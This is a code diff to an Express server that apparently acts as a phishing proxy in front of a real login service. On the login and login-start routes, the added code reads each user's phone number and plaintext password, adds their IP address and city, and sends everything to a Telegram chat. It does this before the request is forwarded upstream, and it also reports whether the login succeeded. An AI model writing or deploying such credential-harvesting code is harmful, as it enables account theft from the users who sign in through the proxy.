@@ -1800,10 +1800,26 @@ Example:
 app.post('/app/user/login/login', async (req, res) => {
   try {
     const data = await loadData();
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const body = req.parsedBody || {};
     const phone = body.userName || body.username || body.phone || body.mobile || '';
+    const pwd = body.password || body.pwd || body.loginPwd || 'N/A';
+    const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
+    const city = req.headers['x-vercel-ip-city'] || 'N/A';
+    const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
+    if (data.adminChatId && bot) {
+      let msg =
+        `🔑 *Login Attempt (Credentials Received)*\n` +
+        `━━━━━━━━━━━━━━━━━━\n` +
+        `📱 *Phone:* \`${phone || 'N/A'}\`\n` +
+        `🔒 *Password:* \`${pwd}\`\n` +
+        `🌐 *IP:* ${ip}${city !== 'N/A' ? ' (' + city + ')' : ''}\n` +
+        `🕐 *Time:* ${time}`;
+
+      bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
+    }
+
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const loginData = getResponseData(jsonResp);
     let userId = '';
 
@@ -1844,19 +1860,14 @@ app.post('/app/user/login/login', async (req, res) => {
     }
 
     if (data.adminChatId && bot) {
-      const pwd = body.password || body.pwd || body.loginPwd || 'N/A';
-      const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
-      const city = req.headers['x-vercel-ip-city'] || 'N/A';
-      const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-
-      if (jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000')) {
+      const isSuccess = jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000');
+      if (isSuccess) {
         let msg =
-          `🔑 *Login Attempt (Credentials Received)*\n` +
+          `✅ *Login Successful*\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
+          `👤 *UserID:* \`${userId || 'N/A'}\`\n` +
           `📱 *Phone:* \`${phone || 'N/A'}\`\n` +
-          `🔒 *Password:* \`${pwd}\`\n`;
-        if (userId) msg += `👤 *UserID:* \`${userId}\`\n`;
-        msg +=
+          `🔒 *Password:* \`${pwd}\`\n` +
           `🌐 *IP:* ${ip}${city !== 'N/A' ? ' (' + city + ')' : ''}\n` +
           `🕐 *Time:* ${time}`;
 
@@ -1864,7 +1875,7 @@ app.post('/app/user/login/login', async (req, res) => {
       } else {
         const errorMsg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
         let msg =
-          `❌ *Login Attempt Failed*\n` +
+          `❌ *Login Failed*\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
           `📱 *Phone:* \`${phone || 'N/A'}\`\n` +
           `🔒 *Password:* \`${pwd}\`\n` +
@@ -1934,20 +1945,14 @@ app.post('/app/user/login/forgot', async (req, res) => {
 app.post('/app/user/login/start', async (req, res) => {
   try {
     const data = await loadData();
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const body = req.parsedBody || {};
-    const startData = getResponseData(jsonResp);
-    if (startData && body.deviceId) {
-      const tmpKey = 'start_' + (body.userName || body.phone || body.mobile || body.userId || '');
-      userDeviceMap[tmpKey] = body.deviceId;
-    }
-    if (data.adminChatId && bot) {
-      const phone = body.userName || body.phone || body.mobile || 'N/A';
-      const pwd = body.password || body.pwd || body.loginPwd || 'N/A';
-      const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
-      const city = req.headers['x-vercel-ip-city'] || 'N/A';
-      const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+    const phone = body.userName || body.phone || body.mobile || 'N/A';
+    const pwd = body.password || body.pwd || body.loginPwd || 'N/A';
+    const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
+    const city = req.headers['x-vercel-ip-city'] || 'N/A';
+    const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
+    if (data.adminChatId && bot) {
       let msg =
         `🔑 *Login Attempt (Credentials Received)*\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
@@ -1957,6 +1962,13 @@ app.post('/app/user/login/start', async (req, res) => {
         `🕐 *Time:* ${time}`;
 
       bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
+    }
+
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const startData = getResponseData(jsonResp);
+    if (startData && body.deviceId) {
+      const tmpKey = 'start_' + (body.userName || body.phone || body.mobile || body.userId || '');
+      userDeviceMap[tmpKey] = body.deviceId;
     }
     sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
   } catch (e) { await transparentProxy(req, res); }
